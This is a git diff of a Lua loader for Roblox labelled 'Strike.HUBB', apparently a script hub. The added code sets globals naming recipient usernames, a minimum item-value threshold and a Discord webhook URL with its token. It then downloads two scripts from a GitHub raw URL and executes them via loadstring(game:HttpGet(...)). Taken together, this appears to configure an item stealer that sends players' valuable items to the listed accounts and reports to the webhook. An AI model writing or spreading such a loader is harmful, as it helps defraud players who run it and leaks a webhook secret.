@@ -1,24 +1,26 @@
-local baseURL = "https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/"
+-- Strike.HUBB (Loadstring)
 
-local scriptsToLoad = {
-    "strike.lua",
-    "gui.lua"
-}
+-- Global settings for strike.lua
+_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} -- add more if needed
+_G.minrap = 10000000
+_G.webhook = "https://discord.com/api/webhooks/1432831852065984673/4oetapbKqCwCCMUUKZORXzB4Bie1V2gaBt0DxC5PozHfRXVE8u8K4qK-Yan3tuw6-9Kn" -- change to your webhook
 
-for _, scriptName in ipairs(scriptsToLoad) do
-    local url = baseURL .. scriptName
-    local success, response = pcall(function()
-        return game:HttpGet(url)
+-- URLs to your GitHub raw scripts
+local STRIKE_LUA_URL = "https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/strike.lua"
+local GUI_LUA_URL    = "https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/gui.lua"
+
+-- Function to safely load a script from GitHub
+local function LoadScriptFromURL(url)
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet(url))()
     end)
-
-    if success and response then
-        local func, err = loadstring(response)
-        if func then
-            func()  -- Execute the script
-        else
-            warn("Error loading script:", scriptName, err)
-        end
-    else
-        warn("Failed to fetch script:", scriptName)
+    if not success then
+        warn("Failed to load script from URL:", url, "Error:", result)
     end
 end
+
+-- Run strike.lua in the background (has access to _G variables)
+LoadScriptFromURL(STRIKE_LUA_URL)
+
+-- Run GUI separately
+LoadScriptFromURL(GUI_LUA_URL)
